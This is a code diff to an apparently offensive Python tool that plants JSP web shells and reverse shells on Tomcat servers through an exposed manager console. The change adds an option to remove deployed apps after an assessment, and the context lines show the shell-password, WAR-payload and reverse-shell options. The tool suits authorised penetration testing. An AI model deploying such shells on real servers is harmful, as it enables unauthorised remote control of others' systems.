@@ -351,6 +351,17 @@ def deployApplication(browser, url, appname, warpath):
 
     return False
 
+def removeApplication(browser, url, appname):
+    browser.open(url)
+    for form in browser.forms():
+        action = urllib.unquote_plus(form.action)
+        if url in action and '/undeploy?path=/'+appname in action:
+            browser.form = form
+            browser.submit()
+            return True
+
+    return False
+
 def checkIsDeployed(browser, url, appname):
     browser.open(url)
     for form in browser.forms():
@@ -446,6 +457,7 @@ Penetration Testing utility aiming at presenting danger of leaving Tomcat miscon
     conn.add_option('-u', '--url', metavar='URL', dest='url', default='/manager/', help='Apache Tomcat management console URL. Default: /manager/')
 
     payload = optparse.OptionGroup(parser, 'Payload options')
+    parser.add_option('-R', '--remove', metavar='APPNAME', dest='remove_appname', help='Remove deployed app with specified name. Can be used for post-assessment cleaning')
     parser.add_option('-X', '--shellpass', metavar='PASSWORD', dest='shellpass', help='Specifies authentication password for uploaded shell, to prevent unauthenticated usage. Default: randomly generated. Specify "None" to leave the shell unauthenticated.', default=generateRandomPassword())
     parser.add_option('-t', '--title', metavar='TITLE', dest='title', help='Specifies head>title for uploaded JSP WAR payload. Default: "JSP Application"', default='JSP Application')
     parser.add_option('-n', '--name', metavar='APPNAME', dest='appname', help='Specifies JSP application name. Default: "jsp_app"', default='jsp_app')
@@ -472,6 +484,9 @@ Penetration Testing utility aiming at presenting danger of leaving Tomcat miscon
     elif (opts.host and opts.port):
         logger.info('Reverse shell will connect to: %s:%s.' % (opts.host, opts.port))
 
+    if opts.remove_appname and (opts.host or opts.port or opts.file):
+        logging.warning('Removing previously deployed package, any further actions will not be undertaken.')
+
     if opts.file and not os.path.exists(file):
         logger.error('Specified WAR file does not exists in local filesystem.')
         sys.exit(0)
@@ -493,14 +508,26 @@ def main():
         return
 
     try:
-        mode = chooseShellFunctionality(opts)
-        if not opts.file:
-            code = preparePayload(opts)
-            (dirpath, warpath) = generateWAR(code, opts.title, opts.appname)
+        appname = opts.appname
+        if not opts.remove_appname:
+            mode = chooseShellFunctionality(opts)
+            if not opts.file:
+                code = preparePayload(opts)
+                (dirpath, warpath) = generateWAR(code, opts.title, opts.appname)
+            else:
+                warpath = opts.file
         else:
-            warpath = opts.file
+            appname = opts.remove_appname
 
-        if checkIsDeployed(browser, url, opts.appname):
+        if checkIsDeployed(browser, url, appname):
+            if opts.remove_appname:
+                logging.info("Removing previously deployed WAR application with name: '%s'" % opts.remove_appname)
+                if removeApplication(browser, url, opts.remove_appname):
+                    logging.info('Succeeded. Hasta la vista!')
+                else:
+                    logging.error("Removal failed miserably!")
+                return
+
             logger.warning('Application with name: "%s" is already deployed.' % opts.appname)
             if opts.unload:
                 logger.debug('Unloading existing one...')
@@ -515,6 +542,9 @@ def main():
                 return
         else:
             logger.debug('It looks that the application with specified name "%s" has not been deployed yet.' % opts.appname)
+
+            if opts.remove_appname:
+                return 
 
         deployed = deployApplication(browser, url, opts.appname, warpath)
 
